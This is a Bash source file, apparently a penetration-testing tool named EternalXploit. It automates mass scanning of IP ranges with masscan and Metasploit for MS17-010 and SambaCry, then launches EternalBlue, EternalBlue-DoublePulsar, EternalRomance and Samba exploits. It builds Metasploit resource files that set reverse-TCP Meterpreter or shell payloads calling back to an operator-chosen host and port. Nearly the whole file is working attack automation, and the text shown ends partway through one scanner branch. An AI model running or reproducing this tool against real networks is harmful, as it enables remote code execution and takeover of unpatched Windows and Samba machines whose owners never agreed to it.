#!/bin/bash
# EternalXploit by Gl33ch3r          
# https://github.com/Gl33ch3r/EternalXploit

# Eternal Xploit Logo
red='\e[1;31m'
white='\033[0;37m'        # White
yellow='\033[0;33m'       # Yellow
blue='\033[0;34m'         # Blue
green='\033[0;32m'        # Green
wine32=/usr/lib/wine/wine
masscan=/usr/lib/masscan
version="1.5"

logo() {
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$green"'     Naval Intelligence and Security Force     '"$red"  '###'
echo -e "$red"'            ###' "$green"'     ********** Philippine Navy **********     '"$red"  '###'
echo -e "$red"'            ###' "$green"' Vulnerability Assesstment Penetration Testing '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$red"'                    COd3d By:'"$green"' Gl33ch3r     '"$green"'Version: ' "$yellow"$version
echo -e "$white"
}

# CTRL+C Interrupt for scanner
trap ctrl_c INT
function ctrl_c() {
if [ "$stat" == "1" ]
then
pkill -f masscan* >/dev/null 2>&1
exit 1
fi
}

# Files copied in instalation
fls="0"

# Variables for Data files & temp files

defdir="/root/EternalXploit"
dir="/usr/share/metasploit-framework/modules/exploits/windows/smb"
msflogs="msflogs.logs"
vulnos="vulnos.txt"
vuln2os="vuln2os.txt"
vulnostmp="vulnostmp.txt"
nmap_path="ms17_010_nmap.nmap"
nmaptocsv_result_ms17_010="nmap_ms17_010_result.csv"
nmap_path_all="all_vuln_nmap.nmap"
nmaptocsv_result="nmap_result.csv"
install="install.txt"
config="$defdir/config.rc"

if [ -e $defdir/$install ]
then
fls="0"
else
fls="1"
fi


if [ $fls == "1" ]
then
echo
echo -e "$green" "Your EternalXploit Data Files were moved to :"
echo -e "$yellow" "$defdir"
echo -e "$yellow" "Press ENTER key To Continue"
read -r cont
yes | cp -rf EternalXploit /usr/local/sbin/ >/dev/null 2>&1
yes | cp -rf EternalXploit.desktop /usr/share/applications/ >/dev/null 2>&1
echo "install" >> "$defdir/$install"
echo
echo -e "$green" "EternalXploit was installed in your system"
echo -e "$yellow" "Write (EternalXploit) anywhere to run it."
echo -e "$yellow" "Press ENTER key To Continue"
read -r cont
EternalXploit --help
exit 1
fi




getdata(){
rm -f "$defdir/$vulnos" >/dev/null 2>&1
vuln1=$(cat $defdir/$msflogs | grep "MS17-010" | awk '{print$2}' | sed -n 1p)
vuln2=$(cat $defdir/$msflogs | grep "MS17-010" | awk '{$1=$3=$4=$5=$6=$7=$8=$9=""; print $0}')
if [ -z "$vuln1" ]
then
echo ""
echo -e "$red" "No vulnerable targets were detected from the list "
delf
else
if [ ! -f "$defdir/$vulnos" ]
then
echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
echo "$vuln2" >> "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vulnos 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
else
echo "$vuln2" > "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp >> $defdir/$vulnos 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
fi
rm -f "$defdir/$msflogs" >/dev/null 2>&1
lm=$(cat $defdir/$vulnos | wc -l)
echo ""
echo -e "$green" "$lm Vulnerable ips found"
echo "---------------------------------------"
# Display the positive results
cat "$defdir/$vulnos" | sed -e "s/:445//g"
echo "---------------------------------------"
echo
echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vulnos"
echo
fi
}
getdata2(){
rm -f "$defdir/$vuln2os" >/dev/null 2>&1
vuln1=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{print$2}' | sed -n 1p)
vuln2=$(cat $defdir/$msflogs | grep "Cleanup " | awk '{$1=$3=$4=$5=$6=$7=$8=$9=""; print $0}')
if [ -z "$vuln1" ]
then
echo ""
echo -e "$red" "No vulnerable targets were detected from the list "
delf
else
if [ ! -f "$defdir/$vuln2os" ]
then
echo "Vulnerable Ips to Eternal Blue exploit (MS17-010) - Scanned by Eternal Scanner" > $defdir/$vulnos
echo "------------------------------------------------------------------------------" >> $defdir/$vulnos
echo "             Detailed Vulnerable IP & Operating System File                   " >> $defdir/$vulnos
echo "+----------------------------------------------------------------------------+" >> $defdir/$vulnos
echo "$vuln2" >> "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp > $defdir/$vuln2os 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
else
echo "$vuln2" > "$defdir/$vulnostmp"
awk '!a[$0]++' $defdir/$vulnostmp >> $defdir/$vuln2os 2>&1
rm -f $defdir/$vulnostmp >/dev/null 2>&1
fi
rm -f "$defdir/$msflogs" >/dev/null 2>&1
lm=$(cat $defdir/$vuln2os | wc -l)
echo ""
echo -e "$green""*****************************************************"
echo -e "$green""*************$cyan Eternal Romance Results$green ***************"
# Display the positive results
cat "$defdir/$vuln2os" | sed -e "s/:445//g"
echo -e "$green""*****************************************************"
echo
echo -e "$yellow" "EternalXploit saved the vulnerable ips to $defdir/$vuln2os"
echo
fi
}

check_nmaptocsv(){

which python > /dev/null 2>&1
      if [ "$?" -eq "1" ]; then
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
   echo -e "$red" "Python Missing"
echo ""
apt-get install python
exit 1
fi 

which pip > /dev/null 2>&1
      if [ "$?" -eq "1" ]; then
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
   echo -e "$red" "Pip Missing"
echo ""
apt-get install python-pip
exit 1
fi 
which nmaptocsv > /dev/null 2>&1
if [ "$?" -eq "1" ]; then
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
   echo -e "$red""Nmaptocsv Missing"
echo ""
pip install nmaptocsv
exit 1
fi  
}

checkdep() {
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "1" ]; then
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
   echo -e "$red""Metasploit Framework Missing"
echo ""
apt-get install metasploit-framework
exit 1
fi  
which masscan > /dev/null 2>&1
if [ "$?" -eq "1" ]; then
echo -e "$red""Masscan Missing"
echo ""
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
apt-get install masscan -y
exit 1
fi 
if ( ! test -x $wine32 )
then
echo -e "$red""Wine Missing"
echo ""
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'         Opps , not connected to Internet      '"$red"  '###'
echo -e "$red"'            #######################################################'
echo
exit 1
fi
dpkg --add-architecture i386 && apt-get update && apt-get install wine32 -y
mkdir -p /root/.wine/drive_c/
exit 1
fi 
}

# Check Files and Directory 
checkfile(){
cp -r deps/ $dir/
cp -r eternalblue_doublepulsar.rb $dir/
touch $config 
echo reload_all > $config > /dev/null 2>&1
echo 'exit' >> $config
/etc/init.d/postgresql start > /dev/null 2>&1
msfconsole -q -r $config
/etc/init.d/postgresql stop > /dev/null 2>&1
rm $config
EternalXploit
}

# Delete temporary files
delf() {
rm -rf "$defdir/temp1.txt" >/dev/null 2>&1
rm -rf "$defdir/temp.txt" >/dev/null 2>&1
rm -f "$defdir/masscan"  >/dev/null 2>&1
rm -f "$defdir/msfip"  >/dev/null 2>&1
rm -f "$defdir/config.rc"  >/dev/null 2>&1
rm -f "$defdir/msflogs.log" >/dev/null 2>&1
rm -f "$path/paused.conf" >/dev/null 2>&1
rm -f "$defdir/pid.tmp" >/dev/null 2>&1
rm -f "$defdir/x$i" >/dev/null 2>&1
rm -f "$defdir/$vulnertmp" >/dev/null 2>&1
rm -f "$defdir/stat" >/dev/null 2>&1
}

# Eternalblue Doublepulsar Exploit
eternalblue_doublepulsar(){
echo
echo -e "$red"'       ****************' "$yellow"'Eternalblue Doublepulsar Exploit'"$red"' ****************'
	echo -e "$white"
	echo '     Exploit targets:'
	echo
   	echo '     Id  Name'
        echo '     --  ----'
        echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$white"'   Windows XP (all services pack) (x86) (x64)'
        echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$white"'   Windows Server 2003 SP0 (x86)'
        echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$white"'   Windows Server 2003 SP1/SP2 (x86)'
        echo -e '     '"$red"'['"$yellow"'3'"$red"']'"$white"'   Windows Server 2003 (x64)'
        echo -e '     '"$red"'['"$yellow"'4'"$red"']'"$white"'   Windows Vista (x86)'
        echo -e '     '"$red"'['"$yellow"'5'"$red"']'"$white"'   Windows Vista (x64)'
        echo -e '     '"$red"'['"$yellow"'6'"$red"']'"$white"'   Windows Server 2008 (x86)' 
        echo -e '     '"$red"'['"$yellow"'7'"$red"']'"$white"'   Windows Server 2008 R2 (x86) (x64)'
        echo -e '     '"$red"'['"$yellow"'8'"$red"']'"$white"'   Windows 7 (all services pack) (x86) (x64)'
	echo -e "$green"
	read -p  '     Please select target: ' target
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address" 
exit 1
fi
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Your IP Address: ' ip

if [[ -z "$ip" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address"
exit 1
fi

#check if user input have any letters
inv=$(echo "$ip" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address" 
exit 1
fi
echo -e "$white"
echo -e "$yellow"'     Range: '"$green"'0 to 65535'
echo -e "$white"
read -p '     Port for reverse connection: ' port
echo
echo '     Enternal Blue Architecture'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' x86 Architecture'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' x64 Architecture'
echo 
read -p '     Please select architecture: ' arch
echo	
echo '     Enternal Blue Payload'
echo
echo -e '     '"$red"'['"$white"'1'"$red"']'"$white"' Meterpreter'
echo -e '     '"$red"'['"$white"'2'"$red"']'"$white"' Shell'
echo
read -p '     Please select payload: ' cmd
if [[ $cmd -eq 1 ]]
then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo use exploit/windows/smb/eternalblue_doublepulsar > $config
if [[ $arch -eq 1 ]]
then
echo set PAYLOAD windows/meterpreter/reverse_tcp >> $config
echo set targetarchitecture x86 >> $config
elif [[ $arch -eq 2 ]]
then
echo set PAYLOAD windows/x64/meterpreter/reverse_tcp >> $config
echo set targetarchitecture x64 >> $config
fi
echo set targer $target >> $config
echo set RHOST $iptarget >> $config
echo set LHOST $ip >> $config
echo set LPORT $port >> $config
echo exploit >> $config
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r $config
/etc/init.d/postgresql stop >/dev/null 2>&1
rm $config
clear
EternalXploit
elif [[ $cmd -eq 2 ]]
then
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo use exploit/windows/smb/eternalblue_doublepulsar > $config
if [[ $arch -eq 1 ]]
then
echo set PAYLOAD windows/shell/reverse_tcp >> $config
echo set targetarchitecture x86 >> $config
elif [[ $arch -eq 2 ]]
then
echo set PAYLOAD windows/x64/shell/reverse_tcp >> $config
echo set targetarchitecture x64 >> $config
fi
echo set targer $target >> $config
echo set RHOST $iptarget >> $config
echo set LHOST $ip >> $config
echo set LPORT $port >> $config
echo exploit >> $config
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q $config
/etc/init.d/postgresql stop >/dev/null 2>&1
rm $config
clear
EternalXploit
else
echo Invalid option...exiting...
fi
}


# MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
eternalblue(){
echo
echo -e "$red"'     *** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption'"$red"' ***'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address" 
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo use exploit/windows/smb/ms17_010_eternalblue > $config
echo set RHOST $iptarget >> $config
echo exploit >> $config
/etc/init.d/postgresql start
msfconsole -q -r $config
/etc/init.d/postgresql stop
rm $config
clear
EternalXploit
}

# MS17-010 EternalRomance/Synergy/Champion Remote Code Execution
eternalromance(){
echo
echo -e "$red"'     *** '"$yellow"'MS17-010 EternalRomance/Synergy/Champion Remote Code Execution'"$red"' ***'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address" 
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo use exploit/windows/smb/ms17_010_psexec > $config
echo set RHOST $iptarget >> $config
echo exploit >> $config
/etc/init.d/postgresql start
msfconsole -q -r $config
/etc/init.d/postgresql stop
rm $config
clear
EternalXploit
}

eternalblue_scanner(){
mass="$defdir/masscan"
delf
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range" 
exit 1
fi

echo
echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
tn=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner started at $tn , Please Wait\033[0m"
rm -rf "$defdir/stat" >/dev/null 2>&1
stat="1"
masscan "$iptarget" -p "445" --rate "500" --output-filename "$mass" >/dev/null 2>&1 
echo ""
tst=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner stopped/finished at $tst \033[0m"
if [ ! -f "$mass" ]
then
echo -e "$yellow" "Scanner results not found"
exit 1
fi
cat "$mass" | grep 'addr=' | awk '{print $3}' | sed -e s/addr=//g |  cut -d '"' -f 2 | tr " " "\n" >$defdir/msfip
msfips="$defdir/msfip"

#check if there was any ip detected with port $port opened
if [ ! -s "$msfips" ]
then
echo
echo -e "$yellow" "   It was not detected in $iptarget any port 445 opened."
exit 1
fi
stat="0"
echo ""
echo -e "$red" "      Checking ips :"
echo -e "$yellow""----------------------------"
echo -e "$green" ""
echo "$(cat $defdir/msfip)"
echo ""
echo -e "$yellow""----------------------------"
lc=$(cat $defdir/msfip | wc -l)
echo "     Collected $lc ips"
echo -e "$yellow""     Checking if the $lc ips are vulnerable"
sleep 4
echo -e "$green" "    Press CTRL+C (1X ONLY) to stop ips vulnerability check"
echo -e "$green" "    (aborting this process will not verify all ips)"
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo spool $defdir/$msflogs > $config
echo use auxiliary/scanner/smb/smb_ms17_010 >> $config
paste -sd, "$defdir/msfip"        \
|sed 's/^/set rhosts /; s/,/, /g'  \
>>"$config"
echo exploit >> $config
echo exit >> $config
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r $config >/dev/null 2>&1
/etc/init.d/postgresql stop >/dev/null 2>&1
rm $config
getdata

}

eternalromance_scanner(){
mass="$defdir/masscan"
delf
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range" 
exit 1
fi

echo
echo -e "$green" "    Press CTRL-C (1X ONLY) to stop the scanner "
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
tn=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner started at $tn , Please Wait\033[0m"
rm -rf "$defdir/stat" >/dev/null 2>&1
stat="1"
masscan "$iptarget" -p "445" --rate "500" --output-filename "$mass" >/dev/null 2>&1 
echo ""
tst=$(date +"%H:%M:%S")
echo -e "     ""\033[33;7mScanner stopped/finished at $tst \033[0m"
if [ ! -f "$mass" ]
then
echo -e "$yellow" "Scanner results not found"
exit 1
fi
cat "$mass" | grep 'addr=' | awk '{print $3}' | sed -e s/addr=//g |  cut -d '"' -f 2 | tr " " "\n" >$defdir/msfip
msfips="$defdir/msfip"

#check if there was any ip detected with port $port opened
if [ ! -s "$msfips" ]
then
echo
echo -e "$yellow""      It was not detected in $iptarget any port 445 opened."
echo
exit 1
fi
stat="0"
echo ""
echo ""
echo -e "$red" "       Checking ips :"
echo -e "$yellow""----------------------------"
echo -e "$green" ""
echo "$(cat $defdir/msfip)"
echo ""
echo -e "$yellow""----------------------------"
lc=$(cat $defdir/msfip | wc -l)
echo "     Collected $lc ips"
echo -e "$yellow""     Checking if the $lc ips are vulnerable"
sleep 4
echo -e "$green" "    Press CTRL+C (1X ONLY) to stop ips vulnerability check"
echo -e "$green" "    (aborting this process will not verify all ips)"
echo ""
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ### ' "$yellow""\033[33;7mPlease Wait , checking $lc ips may take a while\033[0m""$red"  ' ###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo spool $defdir/$msflogs > $config
echo use auxiliary/admin/smb/ms17_010_command >> $config
paste -sd, "$defdir/msfip"        \
|sed 's/^/set rhosts /; s/,/, /g'  \
>>"$config"
echo exploit >> $config
echo exit >> $config
/etc/init.d/postgresql start >/dev/null 2>&1
msfconsole -q -r $config >/dev/null 2>&1
/etc/init.d/postgresql stop >/dev/null 2>&1
rm $config
getdata2

}

samba_exploit(){
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "      Invalid IP Address" 
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'              Starting Exploit . . .           '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
touch $config
echo use exploit/linux/samba/is_known_pipename > $config
echo set RHOST $iptarget >> $config
echo exploit >> $config
echo exit >> $config
/etc/init.d/postgresql start
msfconsole -q -r $config
/etc/init.d/postgresql stop
rm $config
clear
EternalXploit
}

samba_scanner(){
if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range" 
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
nmap -T4 -v -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $iptarget
EternalXploit
}

# Updates EternalXploit
updates(){
echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
if [ $? -ne 0 ]; then
echo -e "$yellow" "Opps , not connected to Internet"
exit 1
fi
rm -f $defdir/version.txt >/dev/null 2>&1
which wget > /dev/null 2>&1
      if [ "$?" -eq "1" ]; then
apt-get install wget -y > /dev/null 2>&1
fi
wget https://raw.githubusercontent.com/Gl33ch3r/EternalXploit/master/version.txt -O $defdir/version.txt > /dev/null 2>&1
v=$(cat $defdir/version.txt)
if [ $version == $v ]
then
clear
echo -e "$green""EternalXploit is up to date!"
exit 1
else
rm -f /usr/local/sbin/EternalXploit >/dev/null 2>&1
wget https://raw.githubusercontent.com/Gl33ch3r/EternalXploit/master/EternalXploit -O /usr/local/sbin/EternalXploit > /dev/null 2>&1
chmod +x /usr/local/sbin/EternalXploit >/dev/null 2>&1
echo ""
clear
echo -e "$green""EternalXploit Binaries where updated to your system"
echo ""
exit 1
fi
}
# Shortcuts
if [ "$1" == "--version" ]
then
echo -e "$yellow""version $version"
exit 1
elif  [ "$1" == "--uninstall" ]
then
echo -e "$red""*** "$yellow"Warning EternalXploit will be uninstalled "$red"***"
echo -e "$yellow" "Press ENTER key To Continue"
read -r cont
rm -f /usr/share/applications/EternalXploit.desktop >/dev/null 2>&1
rm -f /usr/local/sbin/EternalXploit >/dev/null 2>&1
rm -f "$defdir/$install"
exit 1
elif [ "$1" == "--update" ]
then
updates
elif [ "$1" == "--help" ]
then
echo
logo
echo
echo -e "$red"'            ################### '"$green"'EternalXploit'"$yellow" $version"$red"' ##################'
echo -e "$green""                  (https://github.com/Gl33ch3r/EternalXploit)"
echo -e "$red""            --------------------------------------------------------"
echo -e "$white"
echo -e "$green""                         **** Available Shortcuts ****            "
echo ""
echo -e "$green""EternalXploit --eb 192.168.1.1/24 (EternalBlue Vulnerability Scanner)"
echo "EternalXploit --er 192.168.1.1/24 (EternalRomance Vulnerability Scanner)"
echo "EternalXploit --help (Display available shortcuts)"
echo "EternalXploit --update (Update repo from github)"
echo "EternalXploit --version (Display current version)"
echo ""
echo -e "$yellow""Example :""$green"" EternalXploit --eb 192.168.1.1/24"
echo ""
exit 1
elif [ "$1" == "--eb" ]
then
if [ -z "$2" ]
then
EternalXploit --help
echo -e "$yellow" "Value missing"
echo ""
echo -e "$green" "Try (EternalXploit --eb 192.168.1.1)"
echo
exit 1
else
iptarget="$2"
logo
eternalblue_scanner
exit 1
fi
elif [ "$1" == "--er" ]
then
if [ -z "$2" ]
then
EternalXploit --help
echo -e "$yellow" "Value missing"
echo ""
echo -e "$green" "Try (EternalXploit --er 192.168.1.1)"
echo
exit 1
else
iptarget="$2"
logo
eternalromance_scanner
exit 1
fi
fi

# nmap scanner
main_nmap_vuln_scanner(){
rm -f "$defdir/$nmap_path_all" >/dev/null 2>&1
rm -f "$defdir/$nmaptocsv_result" >/dev/null 2>&1
echo
echo -e "$red"'     ************************* '"$yellow"'Nmap Vuln Scanner'"$red"' **********************'
echo
echo
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget

if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range" 
exit 1
fi
echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
nmap -oN $defdir/$nmap_path_all -T4 -v -Pn --open --max-hostgroup 3 --script vuln $iptarget
echo
nmaptocsv -i $defdir/$nmap_path_all -f ip-fqdn-port-protocol-service-version-os-script -o $defdir/$nmaptocsv_result >/dev/null 2>&1 
echo -e "$yellow""     Nmap result saved to $defdir/$nmaptocsv_result"
echo
echo
}
nmap_vuln_scanner(){
check_nmaptocsv
if [ -e /usr/share/nmap/scripts/broadcast-avahi-dos.nse ]
then
mv /usr/share/nmap/scripts/broadcast-avahi-dos.nse /usr/share/nmap/broadcast-avahi-dos.nse
main_nmap_vuln_scanner
mv /usr/share/nmap/broadcast-avahi-dos.nse /usr/share/nmap/scripts/broadcast-avahi-dos.nse
else
main_nmap_vuln_scanner
mv /usr/share/nmap/broadcast-avahi-dos.nse /usr/share/nmap/scripts/broadcast-avahi-dos.nse
fi
}


main(){
if [ -e $dir/eternalblue_doublepulsar.rb ] && [ -d $dir/deps/ ]
then
checkdep
logo
echo
echo -e "$red"'            **********************'"$yellow"' Exploits '"$red"'***********************'
echo
echo
echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$green"' MS17-010 Exploit'
echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$green"' Samba Exploit'
echo -e '     '"$red"'['"$yellow"'3'"$red"']'"$green"' Nmap Vuln Scanner'
echo
echo -e '     '"$red"'['"$yellow"'9'"$red"']'"$yellow"' Check Updates'
echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"' Exit'
echo
echo -e "$green"
read -p '     Please select exploit: ' opts
if [[ $opts -eq 3 ]] 
then
clear
logo
nmap_vuln_scanner
EternalXploit
elif [[ $opts -eq 9 ]] 
then
updates
EternalXploit
elif [[ $opts -eq 1 ]] 
then
clear
logo
echo -e "$white"
echo -e "$red"'            **************'"$yellow"' Enternal Exploits/Scanner '"$red"'**************'
echo
echo
echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$green"'   Eternalblue Doublepulsar Exploit'
echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$green"'   EternalBlue SMB Remote Windows Kernel Pool Corruption Exploit'
echo -e '     '"$red"'['"$yellow"'3'"$red"']'"$green"'   EternalRomance/Synergy/Champion Remote Code Execution Exploit'
echo -e '     '"$red"'['"$yellow"'4'"$red"']'"$green"'   Nmap MS17-010 Eternalblue Scanner'
echo -e '     '"$red"'['"$yellow"'5'"$red"']'"$green"'   MS17-010 Eternalblue Scanner'
echo -e '     '"$red"'['"$yellow"'6'"$red"']'"$green"'   EternalRomance/Synergy/Champion Remote Code Execution Scanner'
echo
echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"'   Back'
echo
echo -e "$green"
read -p '     Please select exploit: ' exploit
if [[ $exploit -eq 1 ]]
then
clear
logo
eternalblue_doublepulsar
elif [[ $exploit -eq 2 ]]
then
clear
logo
eternalblue
elif [[ $exploit -eq 3 ]]
then
clear
logo
eternalromance
elif [[ $exploit -eq 4 ]]
then
clear
logo
rm -f "$defdir/$nmap_path" >/dev/null 2>&1
rm -f "$defdir/$nmaptocsv_result_ms17_010" >/dev/null 2>&1
echo
echo -e "$red"'     ************************* '"$yellow"'Nmap MS17-010 Scanner'"$red"' **********************'
echo
echo
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget

if [[ -z "$iptarget" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range"
exit 1
fi

#check if user input have any letters
inv=$(echo "$iptarget" | grep [a-zA-Z] )
if [[ ! -z "$inv" ]]
then
echo ""
echo -e "$yellow" "     Invalid IP/IP Range" 
exit 1
fi

echo
echo -e "$red"'            #######################################################'
echo -e "$red"'            ###' "$yellow"'               Starting Scan . . .             '"$red"  '###'
echo -e "$red"'            #######################################################'
echo -e "$white"
nmap -oN $defdir/$nmap_path -T4 -v -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 $iptarget >/dev/null 2>&1 
echo
